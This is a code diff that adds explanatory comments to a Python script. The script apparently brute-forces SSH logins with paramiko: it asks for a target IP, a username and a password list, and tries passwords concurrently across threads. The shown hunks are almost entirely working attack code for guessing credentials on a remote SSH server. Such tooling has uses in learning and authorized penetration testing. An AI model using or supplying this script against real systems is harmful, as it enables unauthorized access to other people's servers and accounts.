@@ -1,10 +1,12 @@
 import paramiko
 import threading
 
+#Inputs from the user; alternatively could utilize "sys.argv[]" to accept user input from CLI
 target = input('Please enter target IP address: ')
 username = input('Please enter username to bruteforce: ')
 password_file = input('Please enter location of the password file: ')
 
+#Function for "ssh_connect". Successfull auth will return code 0, failed return code 1.
 def ssh_connect(password, code=0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -16,6 +18,8 @@ def ssh_connect(password, code=0):
     ssh.close()
     return code
 
+#Function for taking password list and trying each password concurrently.
+#We split the password list into chunks and use multiple threads to process chunks concurrently.
 def bruteforce_passwords(passwords):
     for password in passwords:
         try:
